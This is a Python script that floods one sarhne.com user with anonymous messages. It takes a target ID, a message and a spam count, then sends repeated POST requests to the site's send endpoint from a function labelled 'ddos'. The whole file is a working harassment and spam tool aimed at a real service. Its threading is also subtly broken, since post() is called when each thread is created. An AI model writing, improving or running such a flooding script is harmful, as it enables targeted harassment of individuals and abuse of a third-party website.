import requests
import threading
url = "https://www.sarhne.com/ajax/messages/send.html"
id = ""
def post(_msg):
   #msg=this+test+all+opppp&show_my_info=on&img_code=&link=103961398130919630158&bad_words=false&i=null
    myobj = {'msg': str(_msg),  #this the msg
    'show_my_info':'on',
    'img_code':'',
    'link':str(id),  #id of user
    'bad_words':'false',
    'i':'null'
    }
    x = requests.post(url, data = myobj)

  
    print(x.text)

def start(ddos,msg):
    threads = []
    for i in range(ddos):
        t=threading.Thread(target=post(msg))
        t.daemon = True 
        threads.append(t)

    for i in range(ddos):
        threads[i].start()

    for i in range(ddos):
        threads[i].join()


id = input('Enter ID : ')

mqn = int(input(" 1) String Message \n 2) Text File <msg.txt> \n>>"))

if (mqn==1):
    msg = str(input('Enter String msg : '))
else:
    print('[+]Reading msg.txt ..')
    f = open("msg.txt", "r")
    msg = f.read()

sp = int(input("Enter Spam Number : "))
print(f" ID : {id} , SPAM : {sp} , MSG : ({msg}) ")
start(sp,msg)

    

